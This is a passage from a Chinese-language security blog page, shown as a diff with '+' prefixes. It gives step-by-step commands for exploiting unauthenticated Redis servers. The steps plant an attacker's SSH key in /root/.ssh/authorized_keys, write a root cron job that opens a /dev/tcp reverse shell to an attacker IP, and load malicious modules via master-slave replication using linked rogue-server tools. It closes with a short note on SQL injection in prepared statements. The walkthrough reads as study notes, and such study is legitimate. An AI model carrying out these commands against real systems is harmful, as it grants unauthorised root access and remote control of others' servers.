+<p><strong>原理：</strong>数据库中插入一条数据，将本机的公钥作为<code>value</code>，<code>key</code>值随意，然后通过修改数据库的默认路径为<code>/root/.ssh</code>和默认的缓冲文件<code>authorized.keys</code>，把缓冲的数据保存在文件里，这样就可以在服务器端的<code>/root/.ssh</code>下生成一个授权的<code>key</code>。</p>
+<p><strong>注意：</strong>将所有缓冲区的内容下入到authorized.keys文件，只要公钥的内容没被破坏（也不可能破坏）就可以连接上</p>
+<p><strong>1、自己电脑生成公钥文件（Kali上执行）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./images/sqlinject3.png" alt="3.png"></p>
+<p><strong>2、将公钥写入Redis中</strong></p>
+<p>​    说明：将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的缓冲里：</p>
+<p>​    <code>(echo -e &quot;\n\n&quot;; cat 公钥文件; echo -e &quot;\n\n&quot;) &gt; key.txt </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`    `cat /root/.ssh/key.txt | redis-cli -h redis主机 -x set redis_key</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./images/sqlinject4.png" alt="5.png"><img src="/./images/sqlinject5.png" alt="5.png"></p>
+<p>3、将数据保存到目标redis硬盘上</p>
+<p>​    说明：使用攻击机连接目标机器Redis，设置Redis的备份路径为&#x2F;root&#x2F;.ssh&#x2F;并保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">redis<span class="operator">-</span>cli <span class="operator">-</span>h Redis主机</span><br><span class="line"></span><br><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span>root<span class="operator">/</span>.ssh                改变redis文件路径``</span><br><span class="line"></span><br><span class="line">config <span class="keyword">set</span> dbfilename authorized_keys    将缓存保存为文件``</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line"></span><br><span class="line">config <span class="keyword">set</span>  <span class="operator">/</span>root<span class="operator">/</span>.ssh</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> key_name &quot;SSH公钥内容&quot; </span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./images/sqlinject6.png" alt="6.png"></p>
+<h3 id="写入计划任务"><a href="#写入计划任务" class="headerlink" title="写入计划任务"></a>写入计划任务</h3><p><strong>前提条件：</strong></p>
+<p>​    服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证</p>
+<p>​    Root权限运行Redis服务（可选）</p>
+<p><strong>原理：</strong></p>
+<p>​    1、在数据库中插入一条数据，将计划任务的内容作为<code>value</code>，<code>key</code>值随意，</p>
+<p>​    2、然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，可以在服务器端成功写入一个计划任务进行反弹<code>shell</code>。</p>
+<p><strong>使用限制：</strong></p>
+<p>​    Centos的定时任务文件在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;<username></p>
+<p>​    Ubuntu定时任务文件在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;<username>﻿</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">【写入计划任务（反弹shell）操作如下】</span><br><span class="line">redis-cli -h Redis主机</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/攻击者IP/攻击者监听端口 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><strong>实例图片：</strong></p>
+<p><img src="/./images/sqlinject7.png" alt="7.png"><img src="/./images/sqlinject8.png" alt="8.pg"></p>
+<h3 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a><strong>主从复制RCE</strong></h3><p><strong>【01-主从复制RCE】</strong></p>
+<p>PS：未安装成功，未作记录</p>
+<p><strong>背景：</strong><br>        利用 crontab、ssh key、webshell 这三种方式具有一定的容错性，同时 crontab、ssh 服务是服务器的标准命令和服务，因此很多情况下这种通过写文件的方式 getshell 是通杀的。但随着现代服务部署方式的不断发展，组件化成了不可逃避的大趋势。docker就是在该时代背景下的产物之一，在这种部署模式下，一个单一的容器中不会有除了 redis 以外的任何服务存在，包括 ssh 和 crontab，再加上权限的严格控制，所以单纯依靠写文件就很难getshell，在这种情况下我们就需要其他的利用手段。<br>产生：<br>        Redis 在 4.x、5.x 版本中提供了主从模式，主从模式指的是使用单个 redis 为主机，而将其他 redis 作为从机，主机和从机的数据都是一样的，主机只负责写，从机只负责读。在 Redis 4.x 版本后，通过外部扩展可以实现一个新的 Redis 命令来构造恶意 .so 文件，在两个 Redis 实例中设置主从模式的时候，主机可以通过 FULLRESYNC 同步文件到从机上，然后在从机上加载恶意 .so 文件即可执行命令。简单的说就是攻击者（主机）写一个 .so 文件，通过 FULLRESYNC 同步文件到受害者（从机）上。<br><strong>利用条件：</strong><br>    Redis版本：4.x，&lt; 5.0.5<br>    关闭安全模式：</p>
+<p><strong>【02-本地Redis主从复制RCE反弹shell】</strong></p>
+<p>PS：未安装成功，未作记录<br><strong>利用条件：</strong><br>    Redis版本：4.x，&lt; 5.0.5（有版本限制）<br>    关闭安全模式：<br><strong>背景：</strong></p>
+<p>目标机器仅仅允许本地进行登录，这个时候可以通过配合其他漏洞，从目标本地登录 redis。然后手动执行脚本内写死的一些命令<br>将靶机 Redis作为从机，将攻击机器设置为主机<br>然后攻击机器会自动将一些恶意so文件同步给目标机器（从机），从而来实现对目标机器的远程命令执行。</p>
+<p><strong>利用脚本：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> &#x2F;&#x2F;未授权 </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a> &#x2F;&#x2F;Redis有密码</p>
+<h1 id="SQL之预编译"><a href="#SQL之预编译" class="headerlink" title="SQL之预编译"></a>SQL之预编译</h1><p>【预编译存在SQL——静态拼接】<br><strong>使用了字符拼接</strong><br><code>String query = &quot;SELECT * FROM users WHERE username = &#39;&quot; + username + &quot;&#39; AND password = ?&quot;;</code></p>
+<p>【预编译存在SQL——动态拼接】<br><strong>使用了字符拼接+占位符</strong><br><code>String query = &quot;SELECT * FROM &quot; + tablename + &quot; WHERE &quot; + columnname + &quot; = ?&quot;;</code></p>
+<p>【预编译不存在SQL】<br>★<strong>使用了占位符</strong><br><code>String query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;</code></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章进行指正，联系邮箱 vou0515@gmail.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023 closeto
+</p>
+<p class="footer-entry">Built with Hexo</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+        /* 渲染*/
+        function HTMLDecode(text) {
+            var temp = document.createElement("div");
+            temp.innerHTML = text;
+            var output = temp.innerText || temp.textContent;
+            temp = null;
+            return output;
+        }
+        if (window.mermaid){
+            window.mermaid = null
+        }
+        $.getScript("//cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js", function () {
+            var mermaidOptions = JSON.parse(HTMLDecode("{&#34;theme&#34;:&#34;default&#34;,&#34;startOnLoad&#34;:true,&#34;flowchart&#34;:{&#34;useMaxWidth&#34;:false,&#34;htmlLabels&#34;:true}}"))
+            if (window.mermaid) {
+                mermaid.initialize(mermaidOptions)
+                mermaid.contentLoaded()
+            }
+        })
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 562px;
+    }
+    .nav.fullscreen {
+        margin-left: -562px;
+    }
+    .nav-left {
+        width: 140px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
